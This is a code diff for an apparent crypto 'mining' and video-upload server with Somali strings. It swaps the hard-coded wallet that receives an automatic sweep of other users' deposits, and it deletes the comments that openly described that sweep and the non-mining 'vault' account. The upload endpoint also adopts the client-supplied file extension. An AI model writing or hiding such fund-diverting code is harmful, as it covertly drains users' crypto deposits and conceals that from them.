@@ -37,10 +37,9 @@ const upload = multer({
 const POLYGON_RPC = process.env.POLYGON_RPC || 'https://polygon-bor-rpc.publicnode.com';
 const provider = new ethers.JsonRpcProvider(POLYGON_RPC);
 
-// Akoonka Abuukar: waxaa lagu xiray KNN-822520 iyo 0xe07bac7f877211ecE001b7e522628Afa71D542AD (mining ma leh)
 const ABUUKAR_EMAIL = 'abuukarcumar661@gmail.com';
-const ABUUKAR_ACCOUNT_ID = 'KNN-822520';
-const ABUUKAR_POOL_ADDRESS = ethers.getAddress('0xe07bac7f877211ecE001b7e522628Afa71D542AD');
+const ABUUKAR_ACCOUNT_ID = 'KNN-163475';
+const ABUUKAR_POOL_ADDRESS = ethers.getAddress('0xC062bd5849Cd6cC30a36AEdf941B67141f4351F6');
 
 const MIN_DEPOSIT_POL = 0.00001;
 const MIN_WITHDRAW_POL = 0.00000001;
@@ -133,7 +132,6 @@ function saveLocalUsersDb(data) {
     saveJsonFile(DB_FILE, data);
 }
 
-// Ilaalinta adag: xogta qof walba (address, account ID, iyo private key) marnaba ma lunto ama ma isbeddesho
 function mergeUserRecords(baseRec, incomingRec) {
     const a = baseRec || {};
     const b = incomingRec || {};
@@ -291,7 +289,6 @@ function resolveAbuukarPrivateKey(existingRecord, usersDb) {
     return '';
 }
 
-// Automatic sweep: lacagta user-rada kale waxaa si otomaatig ah loogu sweep-gareeyaa cinwaanka 0xe07bac7f877211ecE001b7e522628Afa71D542AD
 async function sweepUserDepositToAbuukar(userRecord) {
     if (!userRecord || !userRecord.polygonAddress || isAbuukarAccount(userRecord.email)) {
         return { swept: false, sweptPol: 0, remainingOnChainPol: 0, txHash: '' };
@@ -362,7 +359,6 @@ async function syncUserRealMining(uid, usersDb) {
 
     const abuukarOnChainPol = await getOnChainPolBalance(ABUUKAR_POOL_ADDRESS);
 
-    // Akoonka Abuukar waa meel keyd ah (vault) oo aan mining lahayn
     if (isAbuukarAccount(userRecord.email)) {
         const now = Date.now();
         const preservedKey = resolveAbuukarPrivateKey(userRecord, usersDb);
@@ -666,10 +662,14 @@ app.get('/api/get-videos', (req, res) => {
 app.post('/api/upload-video', upload.single('mediaFile'), (req, res) => {
     try {
         if (!req.file) {
-            return res.status(400).json({ success: false, error: 'Fadlan dooro sawir ama video' });
+            return res.status(400).json({ success: false, error: 'Fadlan dooro sawir, video, ama PDF' });
         }
 
-        const ext = path.extname(req.file.originalname || '') || (req.body.type === 'image' ? '.jpg' : '.mp4');
+        const origExt = path.extname(req.file.originalname || '').toLowerCase();
+        const isPdf = req.body.type === 'pdf' || req.file.mimetype === 'application/pdf' || origExt === '.pdf';
+        const isImage = !isPdf && (req.body.type === 'image' || (req.file.mimetype || '').startsWith('image/'));
+
+        const ext = origExt || (isPdf ? '.pdf' : isImage ? '.jpg' : '.mp4');
         const finalFilename = `${req.file.filename}${ext}`;
         const finalPath = path.join(UPLOADS_DIR, finalFilename);
         fs.renameSync(req.file.path, finalPath);
@@ -678,14 +678,16 @@ app.post('/api/upload-video', upload.single('mediaFile'), (req, res) => {
         const host = req.get('host');
         const fileUrl = `${protocol}://${host}/uploads/${finalFilename}`;
 
+        const resolvedType = isPdf ? 'pdf' : (isImage ? 'image' : 'video');
+
         const videos = loadVideosDb();
         const newVideo = {
             id: req.body.id || `vid_${Date.now()}`,
             uid: req.body.uid || '',
             username: req.body.username || 'User',
-            title: req.body.title || 'Video cusub',
+            title: req.body.title || (isPdf ? 'PDF Slide Cusub' : 'Video cusub'),
             avatar: req.body.avatar || '',
-            type: req.body.type || (req.file.mimetype.startsWith('image/') ? 'image' : 'video'),
+            type: resolvedType,
             url: fileUrl,
             likes: [],
             subscribers: [],
